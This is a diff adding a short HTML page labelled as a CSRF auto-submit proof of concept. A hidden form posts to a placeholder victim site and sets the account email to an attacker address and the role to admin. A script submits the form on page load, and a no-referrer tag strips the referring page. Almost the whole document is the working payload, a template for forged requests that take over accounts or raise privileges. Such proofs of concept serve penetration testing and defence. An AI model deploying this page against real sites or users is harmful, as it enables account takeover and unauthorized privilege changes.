@@ -1,0 +1,26 @@
+<!doctype html>
+<!-- CSRF auto-submit PoC (form-based) -->
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>CSRF Auto-submit</title>
+  <meta name="referrer" content="no-referrer">
+</head>
+<body>
+  <p>If you see this, the form didn't auto-submit (or was blocked).</p>
+
+  <form id="f" action="https://victim.example/path" method="POST">
+    <!-- Hidden fields: add as needed -->
+    <input type="hidden" name="email" value="attacker@example.com">
+    <input type="hidden" name="role" value="admin">
+  </form>
+
+  <script>
+    // Auto-submit on load
+    window.onload = () => {
+      document.getElementById("f").submit();
+      console.log("SENT CSRF form submit");
+    };
+  </script>
+</body>
+</html>
